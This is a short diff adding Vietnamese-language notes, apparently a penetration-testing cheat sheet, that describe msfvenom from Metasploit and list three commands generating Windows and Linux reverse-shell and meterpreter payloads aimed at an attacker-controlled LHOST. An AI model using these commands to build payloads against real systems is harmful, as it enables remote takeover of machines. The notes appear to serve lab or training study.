@@ -1,0 +1,4 @@
+- msfvenom là một công cụ nằm trong bộ Metasploit Framework, dùng để tạo payload (mã độc / shellcode) theo nhiều định dạng khác nhau.
+- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe`
+- `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f elf -o shell.elf`
+- `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f c`
